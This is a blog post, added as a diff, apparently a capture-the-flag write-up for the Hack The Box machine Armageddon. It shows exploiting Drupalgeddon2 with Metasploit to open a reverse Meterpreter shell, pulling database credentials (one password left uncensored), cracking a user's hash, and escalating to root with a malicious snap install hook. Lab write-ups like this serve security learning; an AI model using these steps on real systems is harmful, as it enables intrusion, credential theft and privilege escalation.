@@ -1,0 +1,204 @@
+---
+layout: post
+title: Armageddon - HTB Writeup
+date: 2021-07-11 19:05:41.000000000 -05:00
+categories: [Hackthebox]
+tags: []
+author: traysoncombs
+permalink: "/armageddon-htb"
+---
+<html><body>
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img src="{{site.baseurl}}/assets/2021/07/image-17.png" alt="" class="wp-image-78"></figure>
+</div>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>*Note: I went ahead and added dashes to censor things like passwords and flags.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>Initial Enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Naturally this box was started off with a good ole nmap scan.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> PORT   STATE SERVICE VERSION
+ 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+ | ssh-hostkey: 
+ |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+ |   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+ |_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+ |<em>http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/  | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  |</em>/LICENSE.txt /MAINTAINERS.txt
+ |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+ |_http-title: Welcome to  Armageddon |  Armageddon</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Looks like all we got is ssh and a Drupal site. Next thing on the agenda is to use droopescan and see if we can find anything interesting.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ droopescan scan drupal -u armageddon.htb
+ [+] Plugins found:                                                              
+     profile http://armageddon.htb/modules/profile/
+     php http://armageddon.htb/modules/php/
+     image http://armageddon.htb/modules/image/
+ [+] Themes found:
+     seven http://armageddon.htb/themes/seven/
+     garland http://armageddon.htb/themes/garland/
+ [+] Possible version(s):
+     <strong>7.56</strong>
+ [+] Possible interesting urls found:
+     Default changelog file - http://armageddon.htb/CHANGELOG.txt
+ [+] Scan finished (0:02:34.038731 elapsed)</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Looks like Drupal version 7.56 is running which just so happens to be vulnerable to the so called "drupalgeddon2" vulnerability. Now the name of the box makes perfect sense. Drupalgeddon2 is a vulnerability in Drupal's renderable-arrays. Basically it allowed an attacker to execute PHP code and thus allowed RCE through PHP functions like exec. You can read more about it <a href="https://www.outsideonline.com/magazine/technology/drupalgeddon-2-what-why/">here</a>. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>There are many ways to exploit this but I just chose to use Metasploit as it's very convenient and I am very lazy.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit -j
+[*<em>] Exploit running as background job 0.</em>
+[*<em>] Started reverse TCP handler on 10.10.14.7:4444  </em>
+<em>[</em>*] Sending stage (39282 bytes) to 10.10.10.233
+[*<em>] Meterpreter session 1 opened (10.10.14.7:4444 -&gt; 10.10.10.233:56450) at 2021-07-11 18:15:40 +0100</em>
+<em>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; sessions 1 </em>
+<em>[*</em>] Starting interaction with 1…
+meterpreter &gt; </code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>And it looks like we got a shell. Next up we do a little enumeration to see if we can get user access.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>Getting User Access</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>I did a little enumeration and found Mysql credentials in the settings.php located in the /var/www/html/sites/default/ directory.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="php" class="language-php">$databases = array (
+   'default' =&gt; 
+   array (
+     'default' =&gt; 
+     array (
+       'database' =&gt; 'drupal',
+       'username' =&gt; 'drupaluser',
+       'password' =&gt; <strong>'CQHEy----------</strong>',
+       'host' =&gt; 'localhost',
+       'port' =&gt; '',
+       'driver' =&gt; 'mysql',
+       'prefix' =&gt; '',
+     ),
+   ),
+ );</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>In order to access mysql I had to use meterpreter's  shell feature.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter &gt; shell
+Process 2371 created.
+Channel 3 created.
+mysql -u drupaluser -pCQHEy------- -e "SHOW TABLES" -D drupal
+Tables_in_drupal
+actions
+authmap
+batch
+block
+block_custom
+[cut out for brevity]
+<b>users</b>
+[cut out for brevity]</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>From here I explored the database a little and found a table called users and within that table a found a password hash for the user "brucetherealadmin" who also happened to be listed in /etc/passwd.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "SELECT * FROM users" -D drupal
+uid    name                            pass    
+1        brucetherealadmin   <strong>$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------</strong></code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>I then ran that hash through hashid to identify what type it is so as to ease the cracking process.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ hashid -j 
+$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------
+Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuB------------------------------------------'
+[+] Drupal &gt; v7.x [JtR Format: <strong>drupal7</strong>]</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Looks like the type is drupal7. Now to input this into JohnTheRipper. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<strong>bo------          (?)
+</strong>1g 0:00:00:00 DONE (2021-07-11 19:10) 1.754g/s 407.0p/s 407.0c/s 407.0C/s tiffany..harley
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Looks like we got Bruce's password. Now we can use this to SSH into the box.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ ssh brucetherealadmin@armageddon.htb
+brucetherealadmin@armageddon.htb's password: 
+Last login: Sun Jul 11 19:25:10 2021 from 10.10.14.7
+[brucetherealadmin@armageddon ~]$ cat user.txt
+<strong>205e6df58-------------------------</strong></code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Success!</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>Privilege Escalation</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>A quick look at what we can run as root reveals a potentially interesting attack vector.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">[brucetherealadmin@armageddon ~]$ sudo -l
+User brucetherealadmin may run the following commands on armageddon:
+     (root) NOPASSWD: /usr/bin/snap install *
+ [brucetherealadmin@armageddon ~]$ </code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>After a quick google search I discovered a <a href="https://gtfobins.github.io/gtfobins/snap/">GTFOBin </a>exists for such a configuration. Similarly to other package managers snap allows packages to include hooks that can be run before and after package installation, basically anything can be run within these hooks and when snap is run with sudo the hooks are executed with sudo permissions. So basically we can create a malicious package that when installed will run a script as root. I am simply going to have it read the root flag as I am lazy, but one could also use it to get a root shell.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>We can use <a href="https://github.com/jordansissel/fpm">fpm </a>on our local machine to create such a package and upload it to the victim using scp.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">$ mkdir -p meta/hooks
+$ printf '#!/bin/sh\n%s; false' "cat /root/root.txt" &gt;meta/hooks/install
+$ chmod +x meta/hooks/install
+$ fpm -n myflagnow -s dir -t snap -a all meta
+Created package {:path=&gt;"myflagnow_1.0_all.snap"}
+$ scp myflagnow_1.0_all.snap brucetherealadmin@armageddon.htb:~
+ brucetherealadmin@armageddon.htb's password: 
+myflagnow_1.0_all.snap                                                                                   100% 4096    28.8KB/s   00:00</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>From here we just need to install the package and the flag should be delivered to us on a silver platter!</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install myflagnow_1.0_all.snap --dangerous --devmode
+ error: cannot perform the following tasks:
+ Run install hook of "myflagnow" snap if present (run hook "install": <strong>31f024b07a8c----------------------</strong>) </code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>And bam just like that we got the root flag.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>Conclusion</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>This was probably one of the easier boxes I have done as it was mostly just CVE's and password cracking, but nevertheless it was still a really fun box and taught me about the importance of keeping your software updated.</p>
+<p><!-- /wp:paragraph --><br />
+</body></html></p>
